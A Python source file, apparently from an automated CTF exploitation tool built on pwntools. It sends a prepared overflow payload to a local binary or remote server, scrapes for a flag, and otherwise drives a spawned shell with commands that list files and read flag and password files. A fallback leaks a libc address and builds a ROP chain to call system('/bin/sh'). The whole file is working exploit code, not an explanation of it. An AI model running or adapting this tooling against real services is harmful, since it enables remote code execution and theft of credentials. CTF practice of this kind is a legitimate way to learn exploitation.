from __future__ import print_function
from pwn import *
import re

def sendExploit(binary_name,properties,remote_server=False,remote_url="",port_num=0):
    
    send_results = {}
    send_results['flag'] = None

    #Create local or remote process
    if remote_server:
        print("[+] start remote exploiting")
        proc = remote(remote_url,port_num)
    else:
        print("[+] start exploiting")
        proc = process(binary_name)

    #Command to send
    input_string = properties['pwn_type']['results']['input']

    proc.sendline(input_string)
    print(repr(input_string))

    #Sometimes the flag is just printed
    results = proc.recvall(timeout=5)

    send_results['flag_found'] = False
    re_result = re.search("flag{.*?}", results)
    if re_result != None:
        send_results['flag_found'] = True
        print("[+] Flag found:")
        print(results)
        send_results['flag'] = re_result.group(0)
    #Flag not in stdout, we have a shell
    else:

        if remote_server:
            proc = remote(remote_url,port_num)
        else:
            proc = process(binary_name)
        proc.sendline(input_string)

        proc.sendline()
        proc.sendline("ls;\n")
        proc.sendline("cat *flag*;\n")
        proc.sendline("cat *pass*;\n")
        command_results = proc.recvall(timeout=30)
        print(command_results)
        re_result = re.search("flag{.*?}", command_results)
        if re_result != None:
            send_results['flag_found'] = True
            print("[+] Flag found:")
            print(command_results)
            send_results['flag'] = re_result.group(0)

    if not send_results['flag_found']:
        print("[~] Failed exploit launch. Switching Endianess")
        #Create local or remote process
        if remote_server:
            proc = remote(remote_url,port_num)
        else:
            proc = process(binary_name)

        #Command to send
        input_string = properties['pwn_type']['results']['input_eb']

        proc.sendline(input_string)
        print(repr(input_string))

        #Sometimes the flag is just printed
        results = proc.recvall(timeout=5)

        send_results['flag_found'] = False
        re_result = re.search("flag{.*?}", results)
        if re_result != None:
            send_results['flag_found'] = True
            print("[+] Flag found:")
            print(results)
            send_results['flag'] = re_result.group(0)
        #Flag not in stdout, we have a shell
        else:

            if remote_server:
                proc = remote(remote_url,port_num)
            else:
                proc = process(binary_name)

                if 'two_phase' in properties['pwn_type']['results'] and properties['pwn_type']['results']['two_phase'][
                    'is_two_phase']:
                    proc2 = process(binary_name)
                    proc2.send('\n')
                    out_no_leak = proc2.recv()
                    proc.send(input_string)
                    out_leak = proc.recv()
                    leak_start = -1
                    for i in xrange(min([len(out_no_leak), len(out_leak)])):
                        if out_no_leak[i] == out_leak[i]:
                            leak_start += 1
                        else:
                            break
                    leak_start += 1
                    if leak_start < len(out_leak):
                        libc = ELF(properties['libc'])
                        leak_function = properties['pwn_type']['results']['two_phase']['leak_function']
                        if '64' in properties['protections']['arch']:
                            leak_len = 6
                            addr_leak_function = u64(out_leak[leak_start:leak_start + leak_len].ljust(8, '\x00'))
                        else:
                            leak_len = 4
                            addr_leak_function = u32(out_leak[leak_start:leak_start + leak_len].ljust(4, '\x00'))
                        addr_libc_base = addr_leak_function - libc.symbols[leak_function]
                        libc.address = addr_libc_base
                        rop = ROP(libc)
                        rop.call(libc.symbols['system'], [libc.search('/bin/sh').next()])
                        rop_chain = rop.chain()
                        offset = properties['pwn_type']['results']['two_phase']['offset']
                        input_string = '0' * offset + rop_chain

            try:
                proc.sendline(input_string)

                command_results = proc.recv(timeout=1)

                proc.sendline()
                proc.sendline("ls;\n")
                proc.sendline("cat *flag*;\n")
                proc.sendline("cat *pass*;\n")
                command_results += proc.recvall(timeout=30)
                print(command_results)
                re_result = re.search("flag{.*?}", command_results)
                if re_result != None:
                    send_results['flag_found'] = True
                    print("[+] Flag found:")
                    print(command_results)
                    send_results['flag'] = re_result.group(0)
            except:
                pass


    return send_results
